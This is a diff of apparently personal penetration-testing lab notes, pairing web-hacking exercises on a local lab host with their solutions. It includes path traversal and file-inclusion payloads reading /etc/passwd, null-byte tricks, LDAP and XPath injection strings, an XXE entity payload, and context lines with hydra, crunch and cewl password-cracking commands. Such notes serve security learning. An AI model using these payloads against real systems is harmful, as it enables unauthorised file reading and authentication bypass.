@@ -1,4 +1,17 @@
 # Phase III: Vulnerbility discovery & Exploitation
+## Directory Traversal
+| excercise | solution |
+|-----------|----------|
+| example&nbsp;1 | ../../../../../../../../../etc/passwd |
+| example&nbsp;2 | /var/www/files/../../../etc/passwd |
+| example&nbsp;3 | ../../../etc/passwd%00 `Null Bytes Injection` |
+
+## File Include
+| excercise | solution |
+|-----------|----------|
+| example&nbsp;1 | ../../../../../../../../../etc/passwd |
+| example&nbsp;2 | ../../../etc/passwd%00 `Null Bytes Injection` |
+
 ## SQL Injection
 | excercise | solution |
 |-----------|----------|
@@ -24,6 +37,12 @@
 |-----------|----------|
 | example&nbsp;1 | http://10.0.2.4/ldap/example1.php `remove all parameter` |
 | example&nbsp;2 | http://10.0.2.4/ldap/example2.php?name=hacker)(cn=*))%00&password=1234 |
+
+## XML attacks
+| excercise | solution |
+|-----------|----------|
+| example&nbsp;1 | http://10.0.2.4/xml/example1.php?xml=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Ctest%3E%26xxe%3B%3C%2Ftest%3E `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>` |
+| example&nbsp;2 | http://10.0.2.4/xml/example2.php?name=hacker%27+or+1=1]%00 `hacker'+or+'1'='1`|
 
 ## Hydra
 ### Secure Shell
@@ -51,16 +70,3 @@ hydra -P /usr/shared/wordlists/rockyou.txt
 * crunch 4 4 -t @%,^ -o mywordlist.txt `@=lowercase characters, %=numbers, ,=uppercase characters, ^=symbols`
 * crunch 4 4 -f /usr/share/crunch/charset.lst lalpha -o mywordlist
 * cewl -d 2 -m 4 -w test.txt http://www.php.net `-d=depth, -m=minimum word length, -w=write`
-
-## Directory Traversal
-| excercise | solution |
-|-----------|----------|
-| example&nbsp;1 | ../../../../../../../../../etc/passwd |
-| example&nbsp;2 | /var/www/files/../../../etc/passwd |
-| example&nbsp;3 | ../../../etc/passwd%00 `Null Bytes Injection` |
-
-## File Include
-| excercise | solution |
-|-----------|----------|
-| example&nbsp;1 | ../../../../../../../../../etc/passwd |
-| example&nbsp;2 | ../../../etc/passwd%00 `Null Bytes Injection` |
